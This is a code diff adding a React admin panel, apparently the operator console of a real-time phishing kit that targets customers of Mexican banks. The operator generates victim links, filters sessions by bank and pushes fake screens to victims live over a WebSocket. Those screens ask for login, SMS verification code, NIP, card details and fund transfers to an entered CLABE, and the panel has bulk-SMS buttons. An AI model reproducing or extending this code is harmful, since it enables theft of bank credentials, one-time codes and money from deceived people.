@@ -1,0 +1,405 @@
+import { useState, useEffect } from 'react';
+import { useQuery, useMutation } from '@tanstack/react-query';
+import { queryClient } from '@/lib/queryClient';
+import { apiRequest } from '@/lib/queryClient';
+import { useToast } from '@/hooks/use-toast';
+import { useWebSocket } from '@/hooks/useWebSocket';
+import Sidebar from '@/components/admin/Sidebar';
+import AccessTable from '@/components/admin/AccessTable';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal } from '@/components/admin/Modals';
+import { Session, ScreenType } from '@shared/schema';
+import { nanoid } from 'nanoid';
+
+export default function AdminPanel() {
+  const { toast } = useToast();
+  const [activeBank, setActiveBank] = useState<string>("todos");
+  const [activeTab, setActiveTab] = useState<'current' | 'saved'>('current');
+  const [activeModal, setActiveModal] = useState<string | null>(null);
+  const [clientLink, setClientLink] = useState<string>('');
+  const [sessions, setSessions] = useState<Session[]>([]);
+  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
+
+  // Socket connection for real-time updates
+  const { socket, connected, sendMessage } = useWebSocket("/ws");
+
+  // Fetch sessions from API
+  const { data: initialSessions, isLoading } = useQuery({
+    queryKey: ['/api/sessions'],
+    refetchInterval: false
+  });
+
+  // Generate link mutation
+  const generateLink = useMutation({
+    mutationFn: async () => {
+      const res = await apiRequest('GET', '/api/generate-link');
+      return await res.json();
+    },
+    onSuccess: (data) => {
+      setClientLink(data.link);
+      toast({
+        title: "Link generado",
+        description: "El link ha sido generado exitosamente.",
+      });
+      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
+    },
+    onError: (error) => {
+      toast({
+        title: "Error al generar link",
+        description: error.message,
+        variant: "destructive",
+      });
+    }
+  });
+
+  // Socket event handlers
+  useEffect(() => {
+    if (connected) {
+      // Register as admin
+      sendMessage({
+        type: 'REGISTER',
+        role: 'ADMIN'
+      });
+    }
+  }, [connected, sendMessage]);
+
+  useEffect(() => {
+    // Initialize sessions from API data
+    if (initialSessions) {
+      setSessions(initialSessions);
+    }
+  }, [initialSessions]);
+
+  // Socket message handler
+  useEffect(() => {
+    if (!socket) return;
+
+    const handleMessage = (event: MessageEvent) => {
+      try {
+        const data = JSON.parse(event.data);
+        
+        if (data.type === 'INIT_SESSIONS') {
+          setSessions(data.data);
+        }
+        else if (data.type === 'SESSION_UPDATE') {
+          setSessions(prev => {
+            const updated = [...prev];
+            const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
+            if (index >= 0) {
+              updated[index] = data.data;
+            } else {
+              updated.push(data.data);
+            }
+            return updated;
+          });
+        }
+      } catch (error) {
+        console.error("Error parsing WebSocket message:", error);
+      }
+    };
+
+    socket.addEventListener('message', handleMessage);
+    return () => {
+      socket.removeEventListener('message', handleMessage);
+    };
+  }, [socket]);
+
+  // Handle screen change
+  const handleScreenChange = (screen: string) => {
+    if (!selectedSessionId) {
+      toast({
+        title: "Seleccione una sesión",
+        description: "Debe seleccionar una sesión para cambiar la pantalla.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    // Handle modals for certain screens
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje"].includes(screen)) {
+      setActiveModal(screen);
+      return;
+    }
+
+    // Send direct screen change for other screens
+    sendScreenChange({
+      tipo: `mostrar_${screen}`,
+      sessionId: selectedSessionId
+    });
+  };
+
+  // Send screen change via WebSocket
+  const sendScreenChange = (data: any) => {
+    if (connected) {
+      sendMessage({
+        type: 'SCREEN_CHANGE',
+        data
+      });
+
+      toast({
+        title: "Pantalla cambiada",
+        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,
+      });
+    } else {
+      toast({
+        title: "Error de conexión",
+        description: "No hay conexión con el servidor.",
+        variant: "destructive",
+      });
+    }
+  };
+
+  // Copy link to clipboard
+  const copyLink = async () => {
+    try {
+      await navigator.clipboard.writeText(clientLink);
+      toast({
+        title: "Link copiado",
+        description: "El link ha sido copiado al portapapeles.",
+      });
+    } catch (error) {
+      toast({
+        title: "Error al copiar",
+        description: "No se pudo copiar el link al portapapeles.",
+        variant: "destructive",
+      });
+    }
+  };
+
+  // Handle session selection
+  const selectSession = (sessionId: string) => {
+    setSelectedSessionId(sessionId);
+  };
+
+  // Modal handlers
+  const closeModal = () => setActiveModal(null);
+
+  const handleProtectConfirm = (amount: string) => {
+    sendScreenChange({
+      tipo: 'mostrar_protege',
+      sessionId: selectedSessionId,
+      saldo: amount
+    });
+    closeModal();
+  };
+
+  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {
+    sendScreenChange({
+      tipo: 'mostrar_transferir',
+      sessionId: selectedSessionId,
+      monto: data.cantidad,
+      titular: data.titular,
+      clabe: data.clabe
+    });
+    closeModal();
+  };
+
+  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {
+    sendScreenChange({
+      tipo: 'mostrar_cancelacion',
+      sessionId: selectedSessionId,
+      monto: data.importe,
+      comercio: data.negocio
+    });
+    closeModal();
+  };
+
+  const handleCodeConfirm = (telefono: string) => {
+    // Update session with phone number and send code screen
+    if (telefono && telefono.length === 10) {
+      const terminacion = telefono.substring(telefono.length - 4);
+      
+      // First update the session with the phone number
+      if (selectedSessionId) {
+        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
+          .then(() => {
+            // Then send the screen change
+            sendScreenChange({
+              tipo: 'mostrar_codigo',
+              sessionId: selectedSessionId,
+              terminacion
+            });
+          })
+          .catch(error => {
+            toast({
+              title: "Error al actualizar teléfono",
+              description: error.message,
+              variant: "destructive",
+            });
+          });
+      }
+    } else {
+      toast({
+        title: "Teléfono inválido",
+        description: "Ingrese un número de teléfono válido de 10 dígitos.",
+        variant: "destructive",
+      });
+      return;
+    }
+    
+    closeModal();
+  };
+
+  const handleMessageConfirm = (mensaje: string) => {
+    sendScreenChange({
+      tipo: 'mostrar_mensaje',
+      sessionId: selectedSessionId,
+      mensaje
+    });
+    closeModal();
+  };
+
+  return (
+    <div className="flex w-full h-screen overflow-hidden">
+      {/* Sidebar */}
+      <Sidebar />
+
+      {/* Main Content */}
+      <div className="flex-1 bg-[#121212] text-white flex flex-col h-screen overflow-hidden">
+        {/* Header Section */}
+        <div className="p-6 pb-0">
+          <div className="flex justify-between items-start">
+            <div>
+              <p className="text-[#00aaff]">Panel / Accesos</p>
+              <h1 className="text-2xl font-bold mb-3">Panel Accesos</h1>
+              
+              <div className="mt-2">
+                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
+                  Acciones / Control de Pantalla:
+                </label>
+                <select 
+                  id="pantallaControl" 
+                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
+                  onChange={(e) => handleScreenChange(e.target.value)}
+                  value=""
+                >
+                  <option value="">Selecciona una opción</option>
+                  <option value="login">1. Login</option>
+                  <option value="codigo">2. Código de verificación</option>
+                  <option value="nip">3. NIP</option>
+                  <option value="protege">4. Protege tu información</option>
+                  <option value="tarjeta">5. Ingresa tarjeta</option>
+                  <option value="transferir">6. Transfiere fondos</option>
+                  <option value="cancelacion">7. Cancelación exitosa</option>
+                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
+                </select>
+              </div>
+            </div>
+            
+            <div className="space-x-2">
+              <button 
+                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all"
+              >
+                Bulk SMS
+              </button>
+              <button 
+                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all"
+              >
+                Enviar SMS
+              </button>
+            </div>
+          </div>
+        </div>
+
+        {/* Link Panel */}
+        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
+          <div className="flex items-center space-x-2">
+            <span className="font-semibold">Liga activa:</span>
+            <a href={clientLink} target="_blank" className="text-[#00aaff]">
+              {clientLink || 'Genere un nuevo link para el cliente'}
+            </a>
+            <button 
+              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
+              onClick={copyLink}
+            >
+              Copiar
+            </button>
+            <button 
+              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+              onClick={() => generateLink.mutate()}
+            >
+              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
+            </button>
+          </div>
+          
+          <select 
+            id="filtroBanco" 
+            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
+            value={activeBank}
+            onChange={(e) => setActiveBank(e.target.value)}
+          >
+            <option value="todos">Todos los bancos</option>
+            <option value="LIVERPOOL">LIVERPOOL</option>
+            <option value="Amex">Amex</option>
+            <option value="BanBajío">BanBajío</option>
+            <option value="BanCoppel">BanCoppel</option>
+            <option value="Banorte">Banorte</option>
+            <option value="Banregio">Banregio</option>
+            <option value="BBVA">BBVA</option>
+            <option value="Citibanamex">Citibanamex</option>
+            <option value="HSBC">HSBC</option>
+            <option value="Invex">Invex</option>
+            <option value="Santander">Santander</option>
+            <option value="Scotiabank">Scotiabank</option>
+            <option value="Spin">Spin</option>
+          </select>
+        </div>
+
+        {/* Tabs */}
+        <div className="mx-6 mt-6 flex space-x-4">
+          <div 
+            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
+              ? 'border-[#00aaff] text-[#00aaff]' 
+              : 'border-transparent hover:text-gray-300'}`}
+            onClick={() => setActiveTab('current')}
+          >
+            Accesos actuales
+          </div>
+          <div 
+            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
+              ? 'border-[#00aaff] text-[#00aaff]' 
+              : 'border-transparent hover:text-gray-300'}`}
+            onClick={() => setActiveTab('saved')}
+          >
+            Accesos guardados
+          </div>
+        </div>
+
+        {/* Table */}
+        <AccessTable 
+          sessions={sessions}
+          activeBank={activeBank}
+          selectedSessionId={selectedSessionId}
+          onSelectSession={selectSession}
+          isLoading={isLoading}
+        />
+      </div>
+
+      {/* Modals */}
+      <ProtectModal 
+        isOpen={activeModal === 'protege'} 
+        onClose={closeModal} 
+        onConfirm={handleProtectConfirm} 
+      />
+      <TransferModal 
+        isOpen={activeModal === 'transferir'} 
+        onClose={closeModal} 
+        onConfirm={handleTransferConfirm} 
+      />
+      <CancelModal 
+        isOpen={activeModal === 'cancelacion'} 
+        onClose={closeModal} 
+        onConfirm={handleCancelConfirm} 
+      />
+      <CodeModal 
+        isOpen={activeModal === 'codigo'} 
+        onClose={closeModal} 
+        onConfirm={handleCodeConfirm} 
+      />
+      <MessageModal 
+        isOpen={activeModal === 'mensaje'} 
+        onClose={closeModal} 
+        onConfirm={handleMessageConfirm} 
+      />
+    </div>
+  );
+}
